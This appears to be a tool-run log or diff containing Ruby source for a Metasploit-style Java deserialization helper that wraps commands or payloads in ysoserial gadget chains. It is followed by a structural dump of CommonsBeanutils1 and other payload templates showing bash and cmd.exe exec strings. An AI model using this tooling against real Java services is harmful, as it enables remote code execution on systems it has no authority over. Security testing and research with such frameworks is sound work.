@@ -1,0 +1,94 @@
+﻿=== generate_java_deserialization_for_payload ===
+# -*- coding: binary -*-
+
+module Msf
+
+module Exploit::JavaDeserialization
+
+  include Msf::Exploit::Powershell
+
+  # Generate a binary blob that when deserialized by Java will execute the specified command using the platform-specific
+  # shell. Many deserialization gadget chains pass the command to `Runtime.getRuntime().exec()` as a string which has
+  # limitations on characters in the command such as whitespace and quotes. Using a specific shell will cause the
+  # command to be invoked as an array using that shell and thus work around those limitations.
+  #
+  # @param [String] name The name of the YSoSerial payload to use.
+  # @param [String] shell The shell to use for executing the command. Must be one of bash, cmd or powershell.
+  # @param [String] command The OS command to execute.
+  #
+  # @return [String] The opaque data blob.
+  def generate_java_deserialization_for_command(name, shell, command)
+    # here we force usage of a modified type to avoid compatibility issues with command characters that are present in
+    # some ysoserial payloads
+    unless %w{ bash cmd powershell }.include? shell
+      raise RuntimeError, 'Invalid shell for Java Deserialization payload generation'
+    end
+
+    if name == 'BeanFactory'
+      blob = Msf::Util::JavaDeserialization::BeanFactory.generate(command, shell: shell)
+    else
+      blob = Msf::Util::JavaDeserialization.ysoserial_payload(name, command, modified_type: shell)
+    end
+
+    blob
+  end
+
+  # Generate a binary blob that when deserialized by Java will execute the specified payload. This routine converts the
+  # payload automatically based on the platform and architecture. Due to this, not all combinations are supported.
+  #
+  # @param [String] name The name of the YSoSerial payload to use.
+  # @param [Msf::EncodedPayload] payload The payload to execute.
+  #
+  # @raise [RuntimeError] This raises a RuntimeError of the specified payload can not be automatically converted to an
+  #   operating system command.
+  #
+  # @return [String] The opaque data blob.
+  def generate_java_deserialization_for_payload(name, payload)
+    command = nil
+
+    if payload.platform.platforms == [Msf::Module::Platform::Windows]
+      if [ Rex::Arch::ARCH_X86, Rex::Arch::ARCH_X64 ].include? payload.arch.first
+        command = cmd_psh_payload(payload.encoded, payload.arch.first, { remove_comspec: true })
+      elsif payload.arch.first == Rex::Arch::ARCH_CMD
+        command = payload.encoded
+      end
+      shell = 'cmd'
+    else
+      if payload.arch.first == Rex::Arch::ARCH_CMD
+        command = payload.encoded
+      end
+      shell = 'bash'
+    end
+
+    if command.nil?
+      raise RuntimeError, 'Could not generate the payload for the platform/architecture combination'
+    end
+
+    generate_java_deserialization_for_command(name, shell, command)
+  end
+
+  def self.gadget_chains
+    chains = Msf::Util::JavaDeserialization.ysoserial_payload_names
+    chains << 'BeanFactory' # not a ysoserial payload, but still supported
+    chains.sort
+  end
+
+end
+end
+=== json structure: bash/CommonsBeanutils1 ===
+[bash] CommonsBeanutils1 status=dynamic rawlen=2822 bufferOffset=[1812] lengthOffset=[577, 1811] magic=aced0005
+   buffer vicinity: b'/lang/String\x07\x000\x01\x00\t/bin/bash\x08\x002\x01\x00\x02-c\x08\x004\x01\x00\x00\x08\x006\x01\x00\x04exec\x01\x00(([Ljava/lang/String;)Ljava'
+[cmd] CommonsBeanutils1 status=dynamic rawlen=2820 bufferOffset=[1810] lengthOffset=[577, 1809] magic=aced0005
+   buffer vicinity: b'va/lang/String\x07\x000\x01\x00\x07cmd.exe\x08\x002\x01\x00\x02/c\x08\x004\x01\x00\x00\x08\x006\x01\x00\x04exec\x01\x00(([Ljava/lang/String;)Ljava'
+[none] CommonsBeanutils1 status=dynamic rawlen=2759 bufferOffset=[1767] lengthOffset=[577, 1766] magic=aced0005
+   buffer vicinity: b"time\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00,\x00-\n\x00+\x00.\x01\x00\x00\x08\x000\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/"
+CommonsCollections2 dynamic ([2102], [867, 2101])
+CommonsCollections5 dynamic ([1912], [1911])
+CommonsCollections6 dynamic ([1115], [1114])
+CommonsBeanutils1 dynamic ([1812], [577, 1811])
+Spring1 dynamic ([2456], [1221, 2455])
+=== java single-file source support ===
+java-single-file-OK 25.0.3
+=== DONE ===
+{"rc": 0, "stdout_len": 4255, "stderr_len": 0}
+
